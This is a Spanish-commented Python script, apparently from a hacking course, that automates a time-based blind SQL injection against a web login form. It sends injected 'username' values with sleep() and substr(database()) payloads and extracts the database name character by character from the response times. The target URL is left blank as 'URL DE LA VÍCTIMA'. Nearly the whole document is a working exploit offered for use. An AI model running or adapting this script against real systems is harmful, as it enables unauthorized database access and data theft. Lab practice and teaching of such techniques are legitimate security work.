#!/bin/usr/python3

# Créditos a @s4vitar y @hack4u

from pwn import *
import requests, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = # URL DE LA VÍCTIMA
characters = string.ascii_lowercase + string.digits + ":,_-."

def sqli():

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyección SQL")

    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
    }

    for position in range(1, 12):
        for character in characters:

            post_data = {
                'op': 'adminlogin',
                'username': "admin' and if(substr(database(),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
                'password': 'test'
             }

            p1.status(post_data['username'])

            time_start = time.time()
            r = requests.post(main_url, data=post_data, headers=headers)
            time_end = time.time()

            if time_end - time_start > 0.85:

                data += character
                p2.status(data)
                break

    p1.success("Inyección SQL completada exitosamente")
    p2.success(data)




if __name__ == '__main__':

    sqli()
